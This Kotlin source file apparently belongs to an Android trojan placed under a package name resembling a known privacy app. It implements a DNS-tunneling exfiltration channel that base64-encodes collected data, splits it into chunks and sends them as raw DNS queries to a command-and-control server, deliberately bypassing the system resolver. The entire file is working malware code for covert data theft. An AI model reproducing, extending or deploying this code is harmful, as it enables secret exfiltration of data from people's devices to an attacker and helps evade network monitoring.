package com.duckduckgo.trojan.impl

import android.util.Base64
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.nio.ByteBuffer

/**
 * DNS-tunneling exfiltration channel.
 *
 * Encodes the result payload as base64, splits it into 40-char chunks, and
 * sends each chunk as a raw DNS A-query directly to the C2 server's DNS listener
 * (dns_server.py). Bypasses the system resolver by using a raw DatagramSocket.
 *
 * Query format:
 *   <b64_chunk>.<seq_3digit>.<task_uuid>.<device_name>.c2
 *   end.<total_3digit>.<task_uuid>.<device_name>.c2
 *
 * The server reassembles chunks by (task_uuid, device_name), decodes base64, and
 * calls store_result() to persist the payload alongside HTTP results.
 */
class DnsExfiltrator(
    private val serverIp: String = C2NetworkModule.C2_SERVER_IP,
    private val serverPort: Int = C2NetworkModule.C2_DNS_PORT,
) {

    fun exfiltrate(taskId: String, deviceName: String, data: String) {
        val b64 = Base64.encodeToString(data.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
        val chunks = b64.chunked(CHUNK_SIZE)

        chunks.forEachIndexed { index, chunk ->
            val qname = "$chunk.${index.toString().padStart(3, '0')}.$taskId.$deviceName.c2"
            sendQuery(qname)
        }

        // End-of-transmission marker carries the total chunk count.
        val endQname = "end.${chunks.size.toString().padStart(3, '0')}.$taskId.$deviceName.c2"
        sendQuery(endQname)
    }

    private fun sendQuery(qname: String) {
        try {
            val packet = buildDnsQuery(qname)
            DatagramSocket().use { socket ->
                socket.soTimeout = TIMEOUT_MS
                val addr = InetAddress.getByName(serverIp)
                socket.send(DatagramPacket(packet, packet.size, addr, serverPort))
                // Wait for the dummy response so we know the packet was received.
                runCatching {
                    val buf = DatagramPacket(ByteArray(512), 512)
                    socket.receive(buf)
                }
            }
        } catch (_: Exception) {
            // DNS exfil is best-effort; a single failed chunk just leaves the
            // payload incomplete on the server side (no crash on the client).
        }
    }

    /**
     * Constructs a minimal DNS A-query packet for [qname].
     *
     * Packet layout (RFC 1035):
     *   2B transaction ID | 2B flags (RD=1) | 2B QDCOUNT=1 | 6B zero counts
     *   QNAME (length-prefixed labels + 0x00 root) | 2B QTYPE=A | 2B QCLASS=IN
     */
    private fun buildDnsQuery(qname: String): ByteArray {
        val buf = ByteBuffer.allocate(512)
        buf.putShort((0..65535).random().toShort())  // transaction ID (random)
        buf.putShort(0x0100.toShort())               // flags: standard query, RD=1
        buf.putShort(1)                               // QDCOUNT = 1
        buf.putShort(0); buf.putShort(0); buf.putShort(0)  // ANCOUNT, NSCOUNT, ARCOUNT
        // QNAME: each label preceded by its length byte
        qname.split(".").forEach { label ->
            buf.put(label.length.toByte())
            buf.put(label.toByteArray(Charsets.US_ASCII))
        }
        buf.put(0)           // root label (end of QNAME)
        buf.putShort(1)      // QTYPE = A
        buf.putShort(1)      // QCLASS = IN
        return buf.array().copyOf(buf.position())
    }

    companion object {
        private const val CHUNK_SIZE = 40
        private const val TIMEOUT_MS = 2000
    }
}
